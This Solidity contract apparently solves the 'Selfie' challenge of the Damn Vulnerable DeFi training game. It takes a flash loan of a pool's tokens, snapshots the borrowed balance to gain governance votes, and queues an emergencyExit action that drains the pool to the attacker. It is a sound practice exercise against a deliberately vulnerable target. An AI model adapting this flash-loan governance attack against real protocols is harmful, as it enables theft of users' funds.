// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SelfiePool.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "../DamnValuableTokenSnapshot.sol";
import "./SimpleGovernance.sol";

contract SelfiePoolAttacker is IERC3156FlashBorrower {
    SelfiePool public immutable sp;
    SimpleGovernance public immutable sg;
    DamnValuableTokenSnapshot private tk;
    address public immutable att;

    constructor(address _sp, address _sg, address _tk) payable {
        sp = SelfiePool(_sp);
        sg = SimpleGovernance(_sg);
        tk = DamnValuableTokenSnapshot(_tk);
        att = msg.sender;
    }

    function attack() public {
        uint256 amount = tk.balanceOf(address(sp));
        sp.flashLoan(this, address(tk), amount, "");
    }

    function attack2() public {
        sg.executeAction(1);
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata
    ) external returns (bytes32) {
        tk.snapshot();
        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", att);
        sg.queueAction(address(sp), 0, data);
        tk.approve(address(sp), amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
